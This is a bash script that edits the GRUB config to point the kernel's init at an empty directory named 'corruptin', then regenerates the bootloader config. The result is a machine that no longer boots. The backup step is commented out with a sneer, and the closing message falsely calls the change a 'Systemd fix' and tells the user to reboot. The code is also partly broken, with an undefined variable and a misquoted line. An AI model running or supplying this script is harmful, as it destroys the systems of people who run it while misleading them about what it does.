#!/usr/bin/env bash
# first of all, my lawyers told me to tell you this
# This script modifes the GRUB bootloader configuration and overrides the system's init
# process. Running it may render your system unbootable or cause severe instability.
# do NOT run this script unless you fully understand how GRUB and the linux boot process
# work.
#
# Always create a backup of /etc/default/grub and your boot configuration before making
# changes.
#
# Test such modifications in a virtual machine or non-critical environment first.
#
# If you run this on a production system without prepration, you may need to use a live USB or
# recovery environment to restore functionality
#
# The author assumes no responsbility for data loss, downtime, or damage caused by
# executing this script. USE ENTIRELY AT YOUR OWN RISK.

#ensure root (important)
if [[ $EUID -ne 0 ]]; then
    echo "Run as root (sudo.)"
    exit 1
fi

G_FILE="/etc/default/grub"

## for legal reasons i have to add this part which i'd rather not, uncomment if 
# you give even the slightest fuck about your system.
# cp "$G_FILE" ${G_FILE}.bak"
# echo "Backed up GRUB config to ${G_FILE}.bak"

#now we can make a placeholder so the system doesn't get lost
mkdir -p /usr/local/sbin/corruptin
#
# remove any existing init= entries and preserve other options
if grep -q "GRUB_CMDLINE_LINUX=" "$G_FILE"; then
    sed -i 's|init=[^ ]*||g' "$G_FILE"
    sed -i 's|GRUB_CMDLINE_LINUX="\(.*\)"|GRUB_CMDLINE_LINUX="\1 init=/usr/local/sbin/corruptin"|' "$GRUB_FILE"
else
    echo 'GRUB_CMDLINE_LINUX="init=/usr/local/sbin/corruptin"' >> "$G_FILE"
fi 

#update grub
if command -v update-grub >/dev/null 2>&1; then 
    update-grub 
elif command -v grub-mkconfig >/dev/null 2>&1; then
    grub-mkconfig -o /boot/grub/grub.cfg
else 
    echo "Could not find update-grub or grub-mkconfig. Please update GRUB manually."
    exit 1
fi

echo "Systemd fix. Please reboot"